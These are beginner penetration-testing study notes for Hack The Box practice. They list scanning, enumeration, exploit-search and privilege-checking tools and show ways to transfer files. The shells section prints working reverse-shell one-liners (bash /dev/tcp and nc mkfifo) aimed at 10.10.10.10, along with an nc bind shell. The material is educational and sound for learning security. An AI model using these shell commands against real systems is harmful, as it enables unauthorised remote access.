
# 🚀 Getting Started with HTB & Pentesting Basics

## 🛠️ Tools and Techniques Introduced

### 🔍 Scanning & Enumeration:
- **Nmap**: For port scanning and service detection.
- **SMB & Shared Folders**: Basics of enumerating open shares.
- **WhatWeb**: Identifies technologies used by websites.
- **Subdomain Enumeration**: Learning subdomain brute-forcing.
- **Directory Listing**: Performed using `gobuster` with `SecLists`.

```bash
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### 📦 Vulnerability Discovery:
- **SearchSploit**: Quickly find public exploits for known services.

```bash
searchsploit apache 2.4.49
```

### ⚙️ Metasploit Framework:
- Basic introduction to using Metasploit for exploitation.
- Example retired boxes for practice:
  - `Granny/Grandpa`, `Jerry`, `Blue`, `Lame`, `Optimum`, `Legacy`, `Devel`

---

## 🧨 Reverse & Bind Shells

#### 🔁 Reverse Shell Examples:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

#### 📡 Bind Shell Example:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

#### 🐚 Post-Exploitation Shell Upgrade:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 📋 Privilege Enumeration

### 🐧 Linux:
- `LinEnum`
- `linuxprivchecker`

### 🪟 Windows:
- `Seatbelt`
- `JAWS`

---

## 🔁 Transferring Files Between Machines

### 1. Python HTTP Server:
On sender machine:
```bash
python3 -m http.server 8000
```

On receiver:
```bash
wget http://<ip>:8000/file.ext
# OR
curl http://<ip>:8000/file.ext -o output.ext
```

### 2. Using SCP (if SSH creds available):
```bash
scp file.xx user@remote:/path/to/destination
```

### 3. Base64 Transfer:
- Encode on sender:
```bash
base64 file -w 0
# output will be a base64 stiring. Copty it 
```
- Decode on receiver:
```bash
echo "<base64string>" | base64 -d > file
# Paste the string and decode it.
```

### ✅ Verification:
Run `md5sum file` on both devices and compare the output hash.

---

This section covered:
- An overview of Information Security
- Penetration testing distros
- Common terms and technologies
- Scanning and enumeration basics
- Using public exploits
- Shells, privilege escalation, and transferring files
- A step-by-step walkthrough of a retired HTB box

the essential building blocks for any pentester.
